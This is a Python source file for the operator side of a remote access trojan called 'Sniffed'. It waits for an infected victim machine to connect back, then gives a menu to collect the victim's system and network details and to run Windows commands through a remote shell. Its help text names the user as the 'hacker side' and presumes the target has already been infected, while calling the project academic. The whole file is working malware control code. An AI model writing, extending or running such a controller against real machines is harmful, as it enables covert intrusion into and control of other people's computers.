# -*- coding: utf-8 -*-
import socket
import json
import os
import re

class Connection():
    def __init__(self, ip: str, port: int):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip = ip
        self.port = port
        self.distant_socket = None

    def listen(self):
        self.s.bind((self.ip, self.port))
        self.s.listen(1)
        print("Waiting for client to connect . . . ")
        self.distant_socket, addr = self.s.accept()
        return addr

    def sending(self, message):
        message = message.encode("utf-8")
        self.distant_socket.send(message)

    def receive(self):
        try:
            message = self.distant_socket.recv(99999).decode()
            return message
        except Exception as e:
            print(e)
            return None

    def stop_listener(self):
        self.sending("exit")
        self.distant_socket.close()
        self.s.close()

class Client():
    def __init__(self):
        self.connection = Connection("localhost", 60000)

    def get_infos(self):
        # Get all the infos from the distant client.
        self.connection.sending("InfoSystem")
        payload = self.connection.receive()
        infosys = json.loads(payload)
        if "infosys" in infosys:
            for key, value in infosys["infosys"].items():
                if "interface" in key:
                    for key1, value1 in value.items():
                        print(f"{key1} :")
                        for e in value1:
                            if e[0] == -1:
                                print(f"\tmac : {e[1]}")
                            elif e[0] == 23:
                                print(f"\tlocal-link : {e[1]}")
                            else:
                                print(f"\tip : {e[1]}")
                                print(f"\tmask : {e[2]}")
                else:
                    print(f"{key} : {value}")
            _ = input("Enter to continue . . .")

    def start_shell_session(self):
        self.connection.sending("shell_att")
        path = self.connection.receive()
        while True:
            command = input(path+">")
            if re.search('[A-z]', command):
                self.connection.sending(command)
                if command.lower() == "quit":
                        break
                elif "cd" in command.lower():
                    path = self.connection.receive()
                else:
                    a = self.connection.receive()
                    print(a)
            else :
                print("Unauthorised command !")
    def start(self):
        os.system("cls")
        # Print logo
        self.logo()

        # Start listening for clients
        addr = self.connection.listen()
        print(f"[+] New client connect with address {addr}")

        # Start dealing with the client
        self.main()

    def main(self):

        # Start loop until exit
        ans = ""
        while ans != "4":
            os.system("cls")
            self.show_menu()
            ans = input("What would you like to do ? \n> ")
            if ans == "1":
                self.get_infos()
            elif ans == "2":
                self.start_shell_session()
            elif ans == "3":
                self.show_info()

        self.exit()

    def exit(self):
        self.connection.stop_listener()
        print("Goodbye !")

    @staticmethod
    def logo():
        print("\n"
              "  __       _  __  __          _ \n"
              " / _\_ __ (_)/ _|/ _| ___  __| |\n"
              " \ \| '_ \| | |_| |_ / _ \/ _` |\n"
              " _\ \ | | | |  _|  _|  __/ (_| |\n"
              " \__/_| |_|_|_| |_|  \___|\__,_|\n")

    @staticmethod
    def show_menu():
        print("\n"
              "     ___________________________________  \n"
              "    /               MENU                \ \n"
              "    \___________________________________/ \n"
              "     |                                 |  \n"
              "     |   [ 1 ]    Get Info             |  \n"
              "     |   [ 2 ]    Remote Shell         |  \n"
              "     |   [ 3 ]    Help                 |  \n"
              "     |   [ 4 ]    Exit                 |  \n"
              "     \_________________________________/  \n")

    @staticmethod
    def show_info():
        print("Here is how the software works :\n"
        "You are on the ""hacker side"" of the software, we suppose that you have infected your target with the malware.\n"
        "This side is your interface to interact with your target.\n"
        "There are two main ways to interact : - Get Info\n"
        "                                      - Remote Shell\n"
        "Get Info will collect and display information about the victim's system.\n"
        "Remote Shell displays a remotely accessible console in which you can execute windows commands on your target's system\n"
        "This project was built purely for academic purposes, not for harm, it is also not perfect.\n"
        "Glacons.\n")

        input("\nPress ENTER to continue . . .")


client = Client()
client.start()
